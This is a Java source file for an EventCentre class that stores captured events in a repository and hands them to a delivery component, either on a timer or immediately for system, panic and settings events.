package com.vvt.eventcentre;

import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import com.vvt.base.FxEvent;
import com.vvt.base.FxEventListener;
import com.vvt.eventdelivery.EventDelivery;
import com.vvt.eventrepository.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.eventrepository.RepositoryChangeListener;
import com.vvt.exceptions.FxNotImplementedException;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.database.FxDbNotOpenException;
import com.vvt.exceptions.database.FxDbOperationException;
import com.vvt.logger.FxLog;

public class EventCentre implements FxEventListener, RepositoryChangeListener{

	private static final String TAG = "EventCentre";
	private static final boolean LOGV = Customization.VERBOSE;
	@SuppressWarnings("unused")
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private long mDeliverTime = -1;
	private Timer mDeliverTimer;
	private TimerTask mTimerTask;
	private FxEventRepository mEventRepository;
	private EventDelivery mEventDelivery;
	
	private boolean mIsFinishInitial;
	
	public EventCentre() {
		mIsFinishInitial = false;
	}
	
	public void setEventRepository(FxEventRepository eventRepository) {
		mEventRepository = eventRepository;
	}
	
	public void setEventDeliveryManager(EventDelivery eventDelivery) {
		mEventDelivery = eventDelivery;
	}
	
	public void setDeliverTimer(long deliverTime) {
		stopDeliverEvents();
		mDeliverTime = deliverTime;
		if(mIsFinishInitial && mDeliverTime != 0) {
			startDeliverEvents();
		} else {
			stopDeliverEvents();
		}
	}
	
	public void initialize() throws FxNullNotAllowedException {
		if(mEventRepository == null) {
			throw new FxNullNotAllowedException("EventRepository can not be null.");
		}
		
		if(mEventDelivery == null) {
			throw new FxNullNotAllowedException("EventDelivery can not be null.");
		}
		
		if(mDeliverTime < 0) {
			throw new FxNullNotAllowedException("Deliver Time not set.");
		}
		
		if(mDeliverTime != 0) {
			startDeliverEvents();
		}
		
		mIsFinishInitial = true;
	}
	
	private void startDeliverEvents() {
		mTimerTask = new TimerTask() {
			
			@Override
			public void run() {
				if(LOGV) FxLog.v(TAG, "mDeliverTimer run start#");
				mEventDelivery.deliverRegularEvents();
				if(LOGV) FxLog.v(TAG, "mDeliverTimer run stop");
			}
		};
		
		if(mDeliverTimer == null) {
			mDeliverTimer = new Timer();
		}
		
		mDeliverTimer.scheduleAtFixedRate(mTimerTask, mDeliverTime, mDeliverTime); //(mTimerTask, 2000); // mDeliverTime
	}
	
	private void stopDeliverEvents(){
		if(LOGV) FxLog.v(TAG, "stopDeliverEvents # START currentThread Id : " + Thread.currentThread().getId());
		
		if(mDeliverTimer != null) {
			mDeliverTimer.cancel();
		}
		
		mDeliverTimer = null;
		
		if(LOGV) FxLog.v(TAG, "stopDeliverEvents # EXIT currentThread Id : " + Thread.currentThread().getId());
	}
	
	@Override
	public void onEventAdd() { }

	@Override
	public void onReachMaxEventNumber() {
		if(LOGV) FxLog.v(TAG, "onReachMaxEventNumber # START currentThread Id : " + Thread.currentThread().getId());
		
		//in requirement if DeliverTime = 0 stop deliver anythings.
		if(mDeliverTime != 0) {
			mEventDelivery.deliverRegularEvents();
		}
		
		if(LOGV) FxLog.v(TAG, "onReachMaxEventNumber # EXIT currentThread Id : " + Thread.currentThread().getId());
	}

	@Override
	public void onSystemEventAdd() {
		if(LOGV) FxLog.v(TAG, "onSystemEventAdd # START currentThread Id : " + Thread.currentThread().getId());
		
		//in requirement if DeliverTime = 0 stop deliver anythings.
		if(mDeliverTime != 0) {
			mEventDelivery.deliverSystemEvents();
		}
		
		if(LOGV) FxLog.v(TAG, "onSystemEventAdd # EXIT currentThread Id : " + Thread.currentThread().getId());
	}

	@Override
	public void onPanicEventAdd() {
		if(LOGV) FxLog.v(TAG, "onPanicEventAdd # START currentThread Id : " + Thread.currentThread().getId());
		
		//in requirement if DeliverTime = 0 stop deliver anythings.
		if(mDeliverTime != 0) {
			mEventDelivery.deliverPanicEvents();
		}
		
		if(LOGV) FxLog.v(TAG, "onPanicEventAdd # EXIT currentThread Id : " + Thread.currentThread().getId());
	}

	@Override
	public void onSettingEventAdd() {
		if(LOGV) FxLog.v(TAG, "onSettingEventAdd # START currentThread Id : " + Thread.currentThread().getId());
		
		//in requirement if DeliverTime = 0 stop deliver anythings.
		if(mDeliverTime != 0) {
			mEventDelivery.deliverSettingsEvents();
		}
		
		if(LOGV) FxLog.v(TAG, "onEventCaptured # EXIT currentThread Id : " + Thread.currentThread().getId());
	}

	@Override
	public synchronized void onEventCaptured(List<FxEvent> events) {
		if(LOGV) FxLog.v(TAG, "onEventCaptured # START currentThread Id : " + Thread.currentThread().getId());
		
		try {
			mEventRepository.insert(events);
			
		} catch (FxDbNotOpenException e) {
			if(LOGE) FxLog.e(TAG, e.getMessage(), e);
		} catch (FxNullNotAllowedException e) {
			if(LOGE) FxLog.e(TAG, e.getMessage(), e);
		} catch (FxNotImplementedException e) {
			if(LOGE) FxLog.e(TAG, e.getMessage(), e);
		} catch (FxDbOperationException e) {
			if(LOGE) FxLog.e(TAG, e.getMessage(), e);
		}
		
		if(LOGV) FxLog.v(TAG, "onEventCaptured # EXIT currentThread Id : " + Thread.currentThread().getId());
	}
}
